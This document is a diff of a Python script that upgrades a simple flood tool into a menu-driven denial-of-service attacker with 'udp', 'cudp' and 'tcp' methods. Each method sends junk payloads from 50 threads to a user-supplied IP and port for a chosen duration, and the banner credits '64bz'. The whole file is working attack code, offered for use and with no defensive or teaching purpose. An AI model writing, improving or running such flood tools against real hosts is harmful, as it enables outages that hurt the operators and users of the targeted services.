@@ -1,69 +1,146 @@
-import threading
-import random
-import sys
-import os
-import socket
-from colorama import init, Fore #you need to install colorama <3
+import threading, fade, random, socket, os, sys, time, struct, signal
+from colorama import init, Fore
+from concurrent.futures import ThreadPoolExecutor
+
+def signal_handler(sig, frame):
+    os.system('clear')
+    sys.exit(0)
+
+signal.signal(signal.SIGINT, signal_handler)
+stop_event = threading.Event()
 
 init(autoreset=True)
 
-def udp_flood(ip, port):
-    num = 0
-    while True:
+def udp(ip, port):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    while not stop_event.is_set():
         try:
-            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as udp:
-                udp.sendto(random._urandom(65535), (ip, port))
-                num += 1
-                print(f" [{Fore.MAGENTA}+{Fore.RESET}] connections: {num}                    ", end='\r')
+            sock.sendto(random._urandom(65507), (ip, port))
         except socket.error as e:
-            print(f" [{Fore.MAGENTA}!{Fore.RESET}] error: {e}", end='\r')
-        except Exception as e:
-            print(f" [{Fore.MAGENTA}!{Fore.RESET}] error: {e}", end='\r')
+            print(f" [{Fore.MAGENTA}!{Fore.RESET}] socket error: {e}               \n", end='\r')
 
-def tcp_flood(ip, port):
-    num = 0
-    while True:
+def cudp(ip, port):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    while not stop_event.is_set():
         try:
-            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as tcp:
-                tcp.connect((ip, port))
-                tcp.send(random._urandom(65535))
-                num += 1
-                print(f" [{Fore.MAGENTA}+{Fore.RESET}] connections: {num}                    ", end='\r')
-        except socket.error as e:
-            print(f" [{Fore.MAGENTA}!{Fore.RESET}] error: {e}", end='\r')
-        except Exception as e:
-            print(f" [{Fore.MAGENTA}!{Fore.RESET}] error: {e}", end='\r')
+            data = bytes(range(256)) * 212
+            payload = build_cudp(7, data)
 
-def main():
+            sock.sendto(payload, (ip, port))
+        except socket.error as e:
+            print(f" [{Fore.MAGENTA}!{Fore.RESET}] socket error: {e}               \n", end='\r')
+
+def tcp(ip, port):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
-        os.system('cls' if os.name == 'nt' else 'clear')
-        ip = input(f"\n [{Fore.MAGENTA}?{Fore.RESET}] target: ")
-        port = int(input(f" [{Fore.MAGENTA}?{Fore.RESET}] port: "))
-        threads = int(input(f" [{Fore.MAGENTA}?{Fore.RESET}] threads: "))
-        protocol = input(f" [{Fore.MAGENTA}?{Fore.RESET}] protocol (tcp/udp): ").lower()
-        #using size as value was useless because it still was 65500 (changed to 65535 <3)
+        sock.connect((ip, port))
+        while not stop_event.is_set():
+            sock.send(random._urandom(4096))
+    except Exception as e:
+        print(f" [{Fore.MAGENTA}!{Fore.RESET}] tcp error: {e}               \n", end='\r')
 
-        if not socket.inet_aton(ip): #shorten
-            print(f" [{Fore.MAGENTA}!{Fore.RESET}] error: invalid ip address")
-            sys.exit(1)
-        if not 0 <= port <= 65535: #shorten
-            print(f" [{Fore.MAGENTA}!{Fore.RESET}] error: invalid port number, must be between 0 and 65535.")
-            sys.exit(1)
+def build_cudp(msg_type, data: bytes):
+    magic = 0xC1
+    version = 0x01
+    flags = 0x00
+    length = len(data)
+
+    header = struct.pack("!BBBBH",
+        magic,
+        version,
+        msg_type,
+        flags,
+        length
+    )
+
+    return header + data
+
+def parse_custom_command(methods):
+    print(f'  [{Fore.MAGENTA}~{Fore.RESET}] usage: <method> <ip> <duration> <port>')
+    raw = input(f"  [{Fore.MAGENTA}?{Fore.RESET}] -> ").strip()
+
+    parts = raw.split()
+    if len(parts) != 4:
+        print(f"  [{Fore.MAGENTA}!{Fore.RESET}] invalid command format\n")
+        return None
+
+    method = parts[0].lower()
+    if method not in methods:
+        print(f"  [{Fore.MAGENTA}!{Fore.RESET}] unknown method: {method}\n")
+        return None
+
+    try:
+        ip = parts[1]
+        duration = int(parts[2])
+        port = int(parts[3])
+
+        socket.inet_aton(ip)
+        if not 0 <= port <= 65535:
+            print(f"  [{Fore.MAGENTA}!{Fore.RESET}] error: port must be between 0–65535\n")
+            return None
+
+        return method, ip, port, duration
 
     except Exception as e:
-        print(f"\n [{Fore.MAGENTA}!{Fore.RESET}] error: {e}")
-        sys.exit()
+        print(f"  [{Fore.MAGENTA}!{Fore.RESET}] error parsing command: {e}\n")
+        return None
 
-    function = udp_flood if protocol == 'udp' else tcp_flood if protocol == 'tcp' else None
-    if not function:
-        print(f" [{Fore.MAGENTA}!{Fore.RESET}] protocol: invalid")
-        sys.exit(1)
+def main():
+    os.system('cls' if os.name == 'nt' else 'clear')
 
-    for _ in range(threads):
-        try:
-            threading.Thread(target=function, args=(ip, port)).start()
-        except Exception as e:
-            print(f"\n [{Fore.MAGENTA}!{Fore.RESET}] error: {e}")
+    banner = '''
+     ._________________.
+     |.---------------.|   
+     ||   -._ .-.     ||    methods: udp, cudp, tcp
+     ||   -._| | |    ||    built by: 64bz
+     ||   -._|"|"|    ||    
+     ||   -._|.-.|    ||
+     ||_______________||    
+     /.-.-.-.-.-.-.-.-.\\ 
+    /.-.-.-.-.-.-.-.-.-.\\   
+   /.-.-.-.-.-.-.-.-.-.-.\\
+  /______/__________\\___o_\\ 
+  \\_______________________/
+    '''
+
+    while True:
+
+        methods = {
+        "udp": udp,
+        "cudp": cudp,
+        "tcp": tcp
+        }
+
+        print(fade.pinkred(banner))
+        result = parse_custom_command(methods)
+
+        if result is None:
+            time.sleep(0.5)
+            os.system('cls' if os.name == 'nt' else 'clear')
+            continue
+
+        method, ip, port, duration = result
+        attack_function = methods[method]
+
+        print(f"\n  [{Fore.LIGHTMAGENTA_EX}~{Fore.RESET}] attack started using {method.upper()}...")
+
+        MAX_WORKERS = 50
+
+        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
+            try:
+                for _ in range(MAX_WORKERS):
+                    executor.submit(attack_function, ip, port)
+
+                time.sleep(duration)
+                stop_event.set()
+
+            except Exception as e:
+                print(f"\n  [{Fore.MAGENTA}!{Fore.RESET}] thread error: {e}\n")
+
+        print(f"  [{Fore.LIGHTMAGENTA_EX}~{Fore.RESET}] attack stopped...             ")
+        input("")
+        os.system('cls' if os.name == 'nt' else 'clear')
 
 if __name__ == "__main__":
-    main() #main thing
+    main()
+    os.system('clear')
